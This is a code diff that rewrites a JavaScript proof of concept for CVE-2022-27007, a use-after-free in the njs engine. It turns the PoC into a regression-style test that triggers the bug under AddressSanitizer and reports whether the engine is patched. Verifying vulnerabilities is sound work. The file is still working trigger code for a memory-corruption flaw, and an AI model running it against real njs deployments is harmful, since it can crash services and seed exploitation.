@@ -1,60 +1,40 @@
-// CVE-2022-27007 Refined Proof of Concept
-// Use-after-free in njs_function_frame_alloc() - Limited execution time
+// CVE-2022-27007 PoC  (use-after-free in njs_function_frame_alloc)
+// Based on the upstream regression test test/js/async_recursive_mid.t.js.
 //
-// This PoC triggers the vulnerability but limits recursion depth to finish quickly
+// The recursive call is NOT awaited: each f(v+1) is scheduled on the
+// microtask queue, so the native C stack stays shallow (no stack overflow
+// even under AddressSanitizer). The vulnerability is that the async frame's
+// spare memory is reused after being freed -> heap-use-after-free, which
+// ASAN traps on the BUGGY njs. The FIXED njs clears the spare pointers and
+// completes cleanly, printing the expected stage trace.
 
-let depth = 0;
-const MAX_DEPTH = 50; // Limit recursion to prevent long execution
+let stages = [];
 
-async function triggerFrameBug() {
-    // Increment depth counter
-    depth++;
-    
-    // Stop recursion after reasonable depth to limit execution time
-    if (depth > MAX_DEPTH) {
-        console.log(`Reached max depth ${MAX_DEPTH} - test completed`);
-        console.log("If this runs without crash, the CVE is likely patched");
-        return "completed";
+async function f(v) {
+    if (v == 1000) {
+        return;
     }
-    
-    // Create local variables to ensure frame has spare memory
-    let localVar1 = `data_${depth}_1`;
-    let localVar2 = `data_${depth}_2`; 
-    let localVar3 = `data_${depth}_3`;
-    
-    // Log progress every 10 iterations
-    if (depth % 10 === 0) {
-        console.log(`Depth: ${depth}`);
-    }
-    
-    // This await triggers njs_function_frame_save()
-    // Vulnerable: saves frame with dangling spare memory pointers
-    // Fixed: clears spare memory fields (native->free = NULL)
-    await Promise.resolve(`save_frame_${depth}`);
-    
-    // Recursive call triggers njs_function_frame_alloc()
-    // Vulnerable: tries to reuse freed spare memory -> UAF crash
-    // Fixed: allocates new memory safely
-    return await triggerFrameBug();
+
+    stages.push('f>' + v);
+
+    await 'X';
+
+    f(v + 1);          // fire-and-forget: drives the frame reuse path, shallow stack
+
+    stages.push('f<' + v);
 }
 
-console.log("Starting CVE-2022-27007 test...");
-console.log("Vulnerable njs 0.7.2: Should crash with heap-use-after-free");
-console.log("Patched njs: Should complete normally");
-
-const startTime = Date.now();
-
-triggerFrameBug()
-.then(result => {
-    const endTime = Date.now();
-    console.log(`Test completed successfully in ${endTime - startTime}ms`);
-    console.log("Result:", result);
-    console.log("CVE appears to be PATCHED - no crash occurred");
+f(0)
+.then(function () {
+    // Expected order for the first few frames on a correct (fixed) engine.
+    var got = stages.slice(0, 5).join(',');
+    var want = 'f>0,f>1,f<0,f>2,f<1';
+    if (got === want) {
+        console.log('CVE-2022-27007: PASS (fixed) stages=' + got);
+    } else {
+        console.log('CVE-2022-27007: UNEXPECTED stages=' + got);
+    }
 })
-.catch(e => {
-    const endTime = Date.now();
-    console.log(`Test failed after ${endTime - startTime}ms`);
-    console.log("Error:", e.message);
-    console.log("This could indicate the CVE is present or other issues");
+.catch(function (e) {
+    console.log('CVE-2022-27007: error ' + e);
 });
-
